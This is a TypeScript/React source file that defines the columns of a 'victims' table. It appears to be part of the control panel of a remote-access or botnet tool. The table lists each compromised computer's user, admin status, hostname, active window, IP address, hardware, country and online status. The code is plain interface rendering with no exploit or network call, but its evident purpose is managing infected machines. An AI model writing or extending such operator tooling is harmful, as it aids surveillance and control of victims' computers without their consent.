import Image from "next/image";
import { useMemo } from "react";
import type { ColumnDef } from "@tanstack/react-table";

import type { Victim } from "../../api/victims";
import { cn } from "../../../../lib/utils";
import { countryCodeToFlagEmoji } from "../utils/country-flag";
import { getVictimDeviceIconSrc } from "../utils/victim-device-icon";
import { formatTime, getLastActiveMs, isVictimOnline } from "../utils/victim-status";
import type { VictimsColumnKey } from "./victims-columns";

export function useVictimsTableColumns(columnOrder: VictimsColumnKey[]): Array<ColumnDef<Victim>> {
   return useMemo(() => {
      const headerMeta = (col: VictimsColumnKey): { label?: string; withIcon?: boolean; iconOnly?: boolean } => {
         switch (col) {
            case "h-country":
               return { label: "loc" };
            case "h-icon":
               return { withIcon: true, iconOnly: true };
            case "h-user":
               return { label: "user", withIcon: true };
            case "h-admin":
               return { label: "admin" };
            case "h-pc-name":
               return { label: "pc-name", withIcon: true };
            case "h-window":
               return { label: "window", withIcon: true };
            case "h-last-active":
               return { label: "last active", withIcon: true };
            case "h-id":
               return { label: "id" };
            case "h-ip":
               return { label: "ip", withIcon: true };
            case "h-os":
               return { label: "os", withIcon: true };
            case "h-cpu":
               return { label: "cpu", withIcon: true };
            case "h-ram":
               return { label: "ram", withIcon: true };
            case "h-gpu":
               return { label: "gpu", withIcon: true };
            case "h-comment":
               return { label: "comment", withIcon: true };
            default:
               return {};
         }
      };

      const headerRenderer = (col: VictimsColumnKey) => {
         const meta = headerMeta(col);
         const label = meta.label;
         const withIcon = !!meta.withIcon;
         const iconOnly = !!meta.iconOnly;

         if (col === "h-admin" || col === "h-id") return label;

         return (
            <span className="thLabel inline-flex items-center gap-[6px]">
               <span className="thSep mr-[6px] opacity-65">|</span>
               {withIcon && (
                  <Image
                     className="thIcon h-[14px] w-[14px] opacity-90 [filter:brightness(0)_invert(1)]"
                     src="/icons/listtop.svg"
                     alt=""
                     width={14}
                     height={14}
                     draggable={false}
                  />
               )}
               {!iconOnly && <span>{label}</span>}
            </span>
         );
      };

      const colDef = (col: VictimsColumnKey): ColumnDef<Victim> => {
         return {
            id: col,
            header: () => headerRenderer(col),
            cell: (ctx) => {
               const v = ctx.row.original;
               const online = isVictimOnline(v);
               const id = String(v.id ?? "");
               const flag = countryCodeToFlagEmoji(v.country);
               const formatLastActive = (victim: Victim): string => {
                  const ms = getLastActiveMs(victim);
                  return ms ? formatTime(ms) : "";
               };

               switch (col) {
                  case "h-country":
                     return flag || v.country || "";
                  case "h-icon":
                     return (
                        <Image
                           className={cn(
                              "h-[36px] w-[36px] align-middle opacity-90",
                              "[filter:grayscale(1)_brightness(0.7)]",
                              online &&
                                 "opacity-100 ![filter:brightness(0)_saturate(100%)_invert(36%)_sepia(99%)_saturate(4245%)_hue-rotate(306deg)_brightness(104%)_contrast(106%)]",
                           )}
                           src={getVictimDeviceIconSrc(v)}
                           alt="icon"
                           width={36}
                           height={36}
                           draggable={false}
                        />
                     );
                  case "h-user":
                     return <span className="font-normal text-white/[0.96]">{v.user ?? ""}</span>;
                  case "h-admin":
                     return v.admin ? "True" : "False";
                  case "h-pc-name":
                     return v.hostname ?? "";
                  case "h-window":
                     return v.window ?? "";
                  case "h-last-active":
                     return formatLastActive(v);
                  case "h-id":
                     return id;
                  case "h-ip":
                     return v.ip ?? "";
                  case "h-os":
                     return v.os ?? "";
                  case "h-cpu":
                     return v.cpu ?? "";
                  case "h-ram":
                     return v.ram ?? "";
                  case "h-gpu":
                     return v.gpu ?? "";
                  case "h-comment":
                     return v.comment ?? "";
                  default:
                     return null;
               }
            },
         };
      };

      return columnOrder.map((k) => colDef(k));
   }, [columnOrder]);
}